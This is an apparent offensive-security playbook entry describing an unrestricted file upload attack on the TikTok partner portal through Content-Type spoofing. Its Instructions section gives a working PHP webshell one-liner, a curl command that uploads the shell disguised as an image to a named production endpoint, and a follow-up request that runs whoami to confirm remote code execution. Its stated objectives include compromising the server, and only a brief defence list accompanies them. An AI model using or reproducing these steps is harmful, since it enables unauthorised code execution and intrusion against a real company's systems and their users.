---
id: proc-tiktok-upload-001
tags:
  - unrestricted-file-upload
  - file-upload
  - rce
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-file-upload-tiktok]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.756Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Unrestricted-File-Upload-via-Content-Type-Manipulation

## Summary

This procedure exploits an unrestricted file upload vulnerability by manipulating the Content-Type header in HTTP requests to upload files with dangerous extensions, such as PHP shells, to a web server. In the context of the TikTok partner portal, it allows attackers to bypass validation and potentially achieve remote code execution on the server.

## Description

The vulnerability stems from insufficient server-side validation of uploaded files, relying solely on the client-supplied Content-Type header rather than analyzing the file content or extension. Attackers can set the Content-Type to a benign value (e.g., image/jpeg) while uploading a malicious file (e.g., .php). Once uploaded, if the server executes or serves the file, it can lead to code execution, data exfiltration, or further compromise. This was reported in the TikTok partner portal at /wsos_v2/oec_partner/upload, rated medium severity (CVSS 5.5). Prerequisites include access to the upload endpoint, possibly requiring authentication.

## Requirements

1. Network access to the target endpoint (HTTPS on port 443)
2. Authentication token or session for the partner portal
3. A malicious payload file (e.g., PHP webshell)
4. curl or similar HTTP client for request manipulation

## Defense

Defensive measures and detection strategies:

- Implement server-side file content validation (e.g., scan for executable code using ClamAV or custom scripts)
- Enforce strict allowlists for file extensions and MIME types
- Monitor upload logs for anomalous Content-Type headers or file sizes
- Use Web Application Firewalls (WAF) to detect header manipulation

## Objectives

1. Successfully upload a file with an arbitrary dangerous extension
2. Gain server-side execution if the file is processed or served
3. Compromise the server environment for further attacks

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Create a simple executable file to test the upload, such as a PHP webshell that executes system commands.

Create the file:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

> This generates a basic PHP file that runs commands passed via the 'cmd' GET parameter.

### Step 2: Authenticate and Upload File

**Context**: Obtain a valid authorization token (e.g., via login to the partner portal) and use [[commands/curl-file-upload-tiktok]] to send the upload request with a spoofed Content-Type.

**Command** ([[commands/curl-file-upload-tiktok]]):
```bash
curl -X POST 'https://partner.tiktokshop.com/wsos_v2/oec_partner/upload' \
  -H 'Content-Type: image/jpeg' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  --data-binary '@shell.php' \
  -o response.json
```

> This command uploads shell.php disguised as an image. Replace YOUR_TOKEN with a valid bearer token. Expected output: JSON response with upload success and file details; check for errors indicating rejection.

### Step 3: Verify Upload and Test Execution

**Context**: Retrieve the uploaded file's location from the response and attempt to access it to confirm execution.

Use curl to test:

```bash
curl 'https://partner.tiktokshop.com/path/to/uploaded/shell.php?cmd=whoami'
```

> If successful, the response will show the server's user (e.g., 'www-data'), indicating RCE. Monitor for 403/404 errors if the file is not executable.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-file-upload-tiktok]]

## Tools Used


## Tags

- [[unrestricted-file-upload]]
- [[rce]]
- [[web-exploitation]]
